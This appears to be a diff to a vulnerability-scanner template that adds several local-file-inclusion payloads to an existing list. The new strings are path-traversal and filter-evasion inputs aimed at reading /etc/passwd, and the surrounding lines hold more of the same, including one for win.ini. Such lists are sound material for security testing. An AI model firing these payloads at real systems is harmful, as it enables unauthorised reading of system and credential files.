@@ -33,6 +33,13 @@ http:
     payloads:
       lfi:
         - "%00%00c:/../../../../windows/win.ini"
+        - "/etc/passwd%3F/"
+        - "/etc%252Fpasswd/"
+        - "/etc%252Fpasswd%3F/"
+        - "///etc/%3F/../passwd"
+        - "${br}/et${u}c%252Fpas${te}swd%3F/"
+        - "$(br)/et$(u)c%252Fpas$(te)swd%3F/"
+        - "///////../../../etc/passwd"
         - "../xxxml_db/../../../../../etc/passwd"
         - "%u002e%u002e%u002e%u002e%u002e%u002e%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u0065%u0074%u0063%u002f%u0070%u0061%u0073%u0073%u0077%u0064"
         - "%25u002e%25u002e%25u002e%25u002e%25u002e%25u002e%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u0065%25u0074%25u0063%25u002f%25u0070%25u0061%25u0073%25u0073%25u0077%25u0064"
